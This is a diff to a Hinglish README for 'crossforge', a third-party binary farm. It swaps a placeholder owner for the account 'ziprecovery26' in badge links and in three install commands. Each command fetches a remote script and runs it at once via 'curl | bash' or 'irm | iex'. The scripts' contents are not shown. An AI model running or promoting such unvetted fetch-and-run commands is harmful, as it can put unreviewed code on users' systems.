@@ -5,10 +5,10 @@
 ### Universal Open-Source Binary Farm
 **Ek repo, jahan se tumhare pasandida open-source project ke pre-built binaries milte hain — Windows, Linux, macOS aur Android/Termux ke liye.**
 
-[![Build](https://img.shields.io/github/actions/workflow/status/OWNER/crossforge/opencode-release.yml?style=flat-square&label=builds)](../../actions)
-[![Nightly](https://img.shields.io/github/actions/workflow/status/OWNER/crossforge/nightly-rebuild.yml?style=flat-square&label=nightly)](../../actions)
+[![Build](https://img.shields.io/github/actions/workflow/status/ziprecovery26/crossforge/opencode-release.yml?style=flat-square&label=builds)](../../actions)
+[![Nightly](https://img.shields.io/github/actions/workflow/status/ziprecovery26/crossforge/nightly-rebuild.yml?style=flat-square&label=nightly)](../../actions)
 [![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![Requests](https://img.shields.io/github/issues/OWNER/crossforge/build-request?style=flat-square&label=requests)](../../issues)
+[![Requests](https://img.shields.io/github/issues/ziprecovery26/crossforge/build-request?style=flat-square&label=requests)](../../issues)
 
 </div>
 
@@ -55,18 +55,18 @@ pura **build provenance** Actions logs mein public hota hai.
 
 **Linux / macOS**
 ```bash
-curl -fsSL https://github.com/OWNER/crossforge/releases/latest/download/install.sh | bash
+curl -fsSL https://github.com/ziprecovery26/crossforge/releases/latest/download/install.sh | bash
 ```
 
 **Windows (PowerShell)**
 ```powershell
-irm https://github.com/OWNER/crossforge/releases/latest/download/install.ps1 | iex
+irm https://github.com/ziprecovery26/crossforge/releases/latest/download/install.ps1 | iex
 ```
 
 **Android / Termux**
 ```bash
 pkg install curl
-curl -fsSL https://github.com/OWNER/crossforge/releases/latest/download/termux-install.sh | bash
+curl -fsSL https://github.com/ziprecovery26/crossforge/releases/latest/download/termux-install.sh | bash
 ```
 
 **Manual download:** [`Releases`](../../releases) → apne platform ka archive uthao → `opencode-<target>` folder mein binary hai.
